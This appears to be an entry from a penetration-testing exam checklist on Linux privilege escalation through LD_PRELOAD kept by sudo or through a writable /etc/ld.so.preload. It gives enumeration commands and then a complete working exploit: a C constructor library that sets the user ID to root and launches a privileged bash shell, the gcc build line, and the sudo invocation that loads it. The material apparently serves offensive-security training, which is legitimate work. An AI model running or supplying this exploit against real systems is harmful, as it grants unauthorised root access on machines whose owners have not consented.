# LPRIV-18. LD_PRELOAD through sudo or a loader file

**Run this when:** `sudo -l` keeps `LD_PRELOAD` in `env_keep`, or `/etc/ld.so.preload` is writable.

**Optional.** Safe to skip under exam time pressure.

```bash
sudo -n -l 2>/dev/null
grep -R 'LD_PRELOAD' /etc/sudoers /etc/sudoers.d 2>/dev/null
ls -l /etc/ld.so.preload 2>/dev/null
```

**Look for:** `env_keep += "LD_PRELOAD"` with any allowed command, or a writable global preload file.

**If found:** compile a constructor library and run the allowed command with it:

```bash
cat > /tmp/owb.c <<'EOF'
#include <unistd.h>
__attribute__((constructor)) void p(void){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",NULL); }
EOF
gcc -shared -fPIC -o /tmp/owb.so /tmp/owb.c
sudo LD_PRELOAD=/tmp/owb.so <ALLOWED_COMMAND>
```

If `gcc` is absent on the target, build the `.so` on Kali for the same architecture and upload it with [XFER-01](./xfer-01).

For `/etc/ld.so.preload`, add the path and run any root-consumed binary. Remove the entry afterwards.
